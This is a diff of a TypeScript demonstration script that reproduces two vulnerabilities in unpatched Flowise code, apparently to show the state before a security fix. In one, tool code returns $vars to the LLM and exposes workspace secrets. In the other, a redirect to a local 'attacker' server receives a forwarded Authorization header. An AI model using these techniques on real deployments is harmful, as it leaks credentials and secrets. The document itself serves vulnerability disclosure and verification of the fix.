@@ -1,19 +1,21 @@
 /**
  * demo/run-before.ts
  *
- * Demonstrates the BEFORE state — without the Zero-Context Guard.
+ * Demonstrates the BEFORE state — using ORIGINAL upstream Flowise code.
+ * The upstream snapshot is demo/legacy/httpSecurity.upstream.ts
+ * (verbatim copy of packages/components/src/httpSecurity.ts at commit 9291856d).
  *
  * Attack 1: $vars exfiltration via tool output
  *   A Custom Tool with no secretBindings receives $vars in scope.
  *   The tool returns JSON.stringify($vars) — the LLM receives every
  *   workspace variable in plain text.
  *
- * Attack 2: Redirect credential forwarding via legacy HTTP path
- *   The sandbox sends a request to Server A with an Authorization header.
- *   Server A redirects to Server B (the "attacker").
- *   The Authorization header is forwarded to Server B verbatim.
- *
- * Nothing here uses the guard. This is the unpatched behaviour.
+ * Attack 2: Redirect credential forwarding (upstream code, NO header stripping)
+ *   The sandbox sends a request to Server A (127.0.0.1:4001) with an
+ *   Authorization header.  Server A redirects to Server B (127.0.0.1:4002).
+ *   The upstream secureAxiosRequest has NO cross-origin header-stripping logic,
+ *   so Authorization is forwarded to Server B verbatim.
+ *   (Our fixed code in httpSecurity.ts strips it — that is the whole point.)
  *
  * Hard internal timeout: 30 s (process.exit(2) + "TIMEOUT" message).
  */
@@ -29,13 +31,21 @@ hardTimeout.unref() // don't let this timer itself prevent exit
 process.env.HTTP_SECURITY_CHECK = 'false'
 
 import * as http from 'http'
-import { secureAxiosRequest } from '../packages/components/src/httpSecurity'
+// Attack 2 deliberately uses the UPSTREAM snapshot, not our fixed code.
+import { secureAxiosRequest as upstreamSecureAxiosRequest } from './legacy/httpSecurity.upstream'
 import { prepareSandboxVars } from '../packages/components/src/utils'
 import { redact } from '../packages/components/src/guardRedact'
+
+const UPSTREAM_COMMIT = '9291856d'
 
 // ── Fake secrets built at runtime ─────────────────────────────────────────────
 const FAKE_OPENAI_KEY = 'sk-' + 'a'.repeat(24)
 const FAKE_DB_PASS = ['my', 'db', 'password', 'xyz', '99999'].join('-')
+
+/** Mask a secret for display: show first 4 chars + *** */
+function maskSecret(s: string): string {
+    return s.slice(0, 4) + '***'
+}
 
 // ── Mock workspace variables (what $vars would contain) ──────────────────────
 const mockVars = [
@@ -60,7 +70,7 @@ function subheader(title: string) {
 
 // ─────────────────────────────────────────────────────────────────────────────
 async function main() {
-    header('BEFORE: no Zero-Context Guard')
+    header(`BEFORE: original upstream Flowise (commit ${UPSTREAM_COMMIT})`)
 
     // ── Attack 1: $vars returned directly by tool code ───────────────────────
     subheader('Attack 1 — tool code returns $vars directly')
@@ -83,9 +93,12 @@ async function main() {
     console.log('  ⚠️  DB_PASSWORD still visible in SSE trace (no static pattern for it)')
 
     // ── Attack 2: redirect credential forwarding ──────────────────────────────
-    subheader('Attack 2 — Authorization header forwarded on cross-host redirect')
+    subheader(`Attack 2 — Authorization header forwarded on redirect (upstream code, commit ${UPSTREAM_COMMIT})`)
+    console.log('  Upstream secureAxiosRequest has NO cross-origin header-stripping logic.')
+    console.log('  Request: GET http://127.0.0.1:4001/start  (Authorization: Bearer ' + maskSecret(FAKE_OPENAI_KEY) + ')')
+    console.log('  Server A (4001) → 302 → Server B (4002, the "attacker")')
+    console.log()
 
-    // Start mock servers (inline, no mock-servers.js import to keep this standalone)
     const received: Record<string, string> = {}
 
     const srvB = http.createServer((req, res) => {
@@ -104,25 +117,24 @@ async function main() {
     await new Promise<void>((r) => srvA.listen(4001, '127.0.0.1', r))
 
     try {
-        // Simulates legacy sandbox code calling secureAxiosRequest directly
-        // with a credential in the Authorization header.
-        await secureAxiosRequest({
+        await upstreamSecureAxiosRequest({
             url: 'http://127.0.0.1:4001/start',
             method: 'GET',
             headers: { Authorization: `Bearer ${FAKE_OPENAI_KEY}` }
         })
 
-        console.log('  Request sent: GET http://127.0.0.1:4001/start')
-        console.log('  Server A redirected → http://127.0.0.1:4002/collect (different host/port)')
-        console.log()
-
+        console.log('  Headers received by attacker server B (127.0.0.1:4002):')
         if (received.authorization) {
-            console.log('  Headers received by attacker server (B):')
+            // Show the real forwarded value — this is the attack, not a fake
             console.log('    authorization:', received.authorization)
             console.log()
-            console.log('  ⚠️  CREDENTIAL FORWARDED to redirect destination!')
+            console.log('  ⚠️  CREDENTIAL FORWARDED — upstream code has no header-stripping on redirect')
         } else {
-            console.log('  (no Authorization header forwarded — guard is active)')
+            // If somehow the header was not forwarded, report that honestly
+            console.log('    authorization: (not received)')
+            console.log()
+            console.log('  NOTE: Authorization was NOT forwarded — upstream may have changed behaviour.')
+            console.log('        This is unexpected; check the snapshot in demo/legacy/httpSecurity.upstream.ts.')
         }
     } finally {
         srvA.close()
